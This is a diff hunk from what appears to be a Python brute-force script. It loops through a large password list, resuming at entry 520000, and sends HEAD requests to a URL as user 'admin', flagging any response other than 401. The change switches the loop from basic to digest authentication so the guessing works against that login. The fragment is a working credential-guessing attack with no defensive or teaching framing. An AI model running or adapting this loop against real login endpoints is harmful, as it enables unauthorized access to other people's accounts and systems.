@@ -20,7 +20,7 @@ total = 520000
 # make a request with each password, starting at the last one logged
 for i in range(total, len(passwords)):
     # too easy
-    request = requests.head(url1, auth=('admin', passwords[i]))
+    request = requests.head(url1, auth=HTTPDigestAuth('admin', passwords[i]))
     # Reference: 401 Unauthorized & 200 Ok
     # triggers on status codes other than 200 but i'd want to know about those, too
     if request.status_code != 401:
